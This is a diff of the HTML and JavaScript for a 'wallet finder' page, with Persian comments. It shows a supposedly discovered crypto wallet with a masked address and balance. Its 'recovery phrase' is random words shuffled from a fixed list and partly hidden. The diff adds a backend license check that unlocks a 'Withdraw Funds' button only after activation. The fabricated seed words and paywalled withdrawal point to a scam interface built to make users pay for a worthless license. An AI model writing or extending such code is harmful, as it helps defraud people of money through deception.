@@ -78,49 +78,84 @@
       Loading...
     </div>
     <div class="mnemonic" id="mnemonicWords"></div>
-    <button class="btn" onclick="goToLicense()">Activate Wallet</button>
+    <button class="btn" id="licenseBtn">Activate Wallet</button>
   </div>
 
   <script>
-    function goToLicense() {
-      window.location.href = "license.html";
+    const API_BASE_URL = "https://dolphinwalletfinderbackend-production.up.railway.app";
+
+    function checkLicenseStatus() {
+      const token = localStorage.getItem("token");
+      if (!token) {
+        alert("Please log in first.");
+        window.location.href = "login.html";
+        return;
+      }
+
+      fetch(API_BASE_URL + "/api/license/status", {
+        headers: { "Authorization": "Bearer " + token }
+      })
+      .then(res => res.json())
+      .then(data => {
+        if (data.license !== "active") {
+          // اگر لایسنس فعال نیست، دکمه رو به فعال‌سازی لایسنس وصل می‌کنیم
+          document.getElementById("licenseBtn").onclick = () => {
+            window.location.href = "license.html";
+          };
+        } else {
+          // اگر لایسنس فعاله، دکمه رو به برداشت یا ادامه کار وصل می‌کنیم
+          document.getElementById("licenseBtn").textContent = "Withdraw Funds";
+          document.getElementById("licenseBtn").onclick = () => {
+           window.location.href = "transaction.html";
+          };
+        }
+      })
+      .catch(() => {
+        alert("Server error occurred.");
+      });
     }
 
-    const wallet = JSON.parse(localStorage.getItem("found_wallet"));
-    if (wallet) {
-      const address = wallet.address;
-      const maskedAddress = address.substring(0, 6) + "••••••••" + address.slice(-4);
-      document.getElementById("walletInfo").innerHTML = `
-        <strong>Address:</strong><br>${maskedAddress}<br><br>
-        <strong>Balance:</strong> ${wallet.balance}<br>
-        <strong>Network:</strong> ${wallet.network}<br>
-        <strong>Last Transaction:</strong> ${wallet.lastTx}
-      `;
+    function loadWalletData() {
+      const wallet = JSON.parse(localStorage.getItem("found_wallet"));
+      if (wallet) {
+        const address = wallet.address;
+        const maskedAddress = address.substring(0, 6) + "••••••••" + address.slice(-4);
+        document.getElementById("walletInfo").innerHTML = `
+          <strong>Address:</strong><br>${maskedAddress}<br><br>
+          <strong>Balance:</strong> ${wallet.balance}<br>
+          <strong>Network:</strong> ${wallet.network}<br>
+          <strong>Last Transaction:</strong> ${wallet.lastTx}
+        `;
 
-      const allWords = [
-        "trouble", "filter", "gallery", "oxygen", "salmon", "silent",
-        "pistol", "bounce", "diamond", "trigger", "planet", "furnace",
-        "immune", "flee", "people", "initial", "panic", "crucial",
-        "display", "grace", "aim", "copper", "fashion", "pelican",
-        "pulp", "average", "wheel", "pride", "sketch", "flag",
-        "narrow", "object", "juice", "victory", "swallow", "refuse",
-        "goat", "dune", "phrase", "hole", "boy", "maid",
-        "report", "exhibit", "ride", "lecture", "dynamic", "burger",
-        "fork", "disorder", "assume", "table", "dawn", "hood",
-        "office", "art", "share", "later", "sell", "paper",
-        "quick", "steel", "acid", "taste", "promote", "robust",
-        "false", "hockey", "employ", "dinner", "scene", "rain"
-      ];
-      const selected = allWords.sort(() => 0.5 - Math.random()).slice(0, 12);
-      const maskedIndices = [2, 4, 5, 6, 8, 10];
-      const wordInputs = selected.map((word, index) => {
-        return `<input type="text" readonly value="${maskedIndices.includes(index) ? '••••••' : word}" />`;
-      }).join("");
+        const allWords = [
+          "trouble", "filter", "gallery", "oxygen", "salmon", "silent",
+          "pistol", "bounce", "diamond", "trigger", "planet", "furnace",
+          "immune", "flee", "people", "initial", "panic", "crucial",
+          "display", "grace", "aim", "copper", "fashion", "pelican",
+          "pulp", "average", "wheel", "pride", "sketch", "flag",
+          "narrow", "object", "juice", "victory", "swallow", "refuse",
+          "goat", "dune", "phrase", "hole", "boy", "maid",
+          "report", "exhibit", "ride", "lecture", "dynamic", "burger",
+          "fork", "disorder", "assume", "table", "dawn", "hood",
+          "office", "art", "share", "later", "sell", "paper",
+          "quick", "steel", "acid", "taste", "promote", "robust",
+          "false", "hockey", "employ", "dinner", "scene", "rain"
+        ];
+        const selected = allWords.sort(() => 0.5 - Math.random()).slice(0, 12);
+        const maskedIndices = [2, 4, 5, 6, 8, 10];
+        const wordInputs = selected.map((word, index) => {
+          return `<input type="text" readonly value="${maskedIndices.includes(index) ? '••••••' : word}" />`;
+        }).join("");
 
-      document.getElementById("mnemonicWords").innerHTML = wordInputs;
-    } else {
-      document.getElementById("walletInfo").innerHTML = "❌ No wallet data found.";
+        document.getElementById("mnemonicWords").innerHTML = wordInputs;
+      } else {
+        document.getElementById("walletInfo").innerHTML = "❌ No wallet data found.";
+      }
     }
+
+    // اجرای توابع بعد از لود شدن صفحه
+    loadWalletData();
+    checkLicenseStatus();
   </script>
 </body>
 </html>
